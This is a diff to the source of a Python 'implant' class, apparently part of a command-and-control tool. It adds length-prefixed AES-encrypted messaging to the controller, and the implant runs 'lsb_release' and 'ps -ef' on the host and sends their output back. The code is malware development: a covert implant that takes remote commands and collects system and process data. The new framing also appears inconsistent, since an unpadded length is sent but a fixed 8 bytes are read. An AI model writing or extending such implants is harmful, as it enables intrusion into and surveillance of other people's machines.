@@ -56,24 +56,27 @@ class implant:
     def send_msg(self, data):
         aes = C2_AES(self.aes_secret)
         msg = aes.encrypt(data)
+        self.sock.send(str(len(msg)).encode())
+        print(f"sent len of {len(msg)}")
         self.sock.send(msg)
 
     def communicate(self):
         while True:
-            data = self.sock.recv(1024)
+            data_len = self.sock.recv(8)
+            data = self.sock.recv(int(data_len.decode()))
             aes = C2_AES(self.aes_secret)
             data = aes.decrypt(data)
             print(f"Recieved {data.decode()}")
             if data.decode() == "test":
                 print("Sending synack...")
                 time.sleep(1)
-                self.sock.send("synack".encode())
+                self.send_msg("synack")
             elif data.decode() == "lsb_release":
                 data = subprocess.check_output(['lsb_release', '-a'])
                 self.send_msg(data.decode())
             elif data.decode() == "ps":
                 data = subprocess.check_output(['ps', '-ef'])
-                self.send_msg(data)
+                self.send_msg(data.decode())
 
     def intro(self):
         key_gen = key()
